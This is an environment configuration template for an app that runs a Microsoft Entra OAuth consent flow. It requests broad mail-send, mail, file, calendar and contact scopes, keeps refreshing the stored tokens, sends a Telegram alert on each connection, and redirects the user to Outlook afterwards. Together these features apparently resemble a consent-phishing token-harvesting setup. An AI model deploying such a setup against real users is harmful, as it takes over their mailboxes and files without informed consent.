TENANT_ID=common
CLIENT_ID=YOUR_APPLICATION_CLIENT_ID
# For Render / server-side token exchange, create a client secret and set:
CLIENT_SECRET=YOUR_CLIENT_SECRET_VALUE

# Your Entra app Redirect URI should match exactly:
REDIRECT_URI=http://localhost:3000/callback
# Where to send the user's browser after /callback succeeds:
POST_AUTH_REDIRECT=https://outlook.office.com/mail/
# Protect homepage + admin endpoints (leave empty to disable):
ADMIN_PASSWORD=change_me

# Telegram notification on successful connection (optional):
# IMPORTANT: do NOT commit real secrets; set these in Render Environment variables.
TELEGRAM_BOT_TOKEN=
TELEGRAM_CHAT_ID=

# Refresh behavior:
# Refresh access tokens this many seconds before they expire (default 300 = 5 minutes)
REFRESH_SKEW_SECONDS=300
# Optional background refresh loop (0 disables). Example: refresh all users every 600s.
REFRESH_EVERY_SECONDS=0
PORT=3000

# Render Postgres (recommended for production token storage):
# DATABASE_URL=postgresql://USER:PASSWORD@HOST/DATABASE

# Space-separated scopes to request in the consent page:
SCOPES=openid profile email offline_access User.Read Mail.ReadWrite Mail.Send Calendars.ReadWrite Contacts.ReadWrite Files.ReadWrite


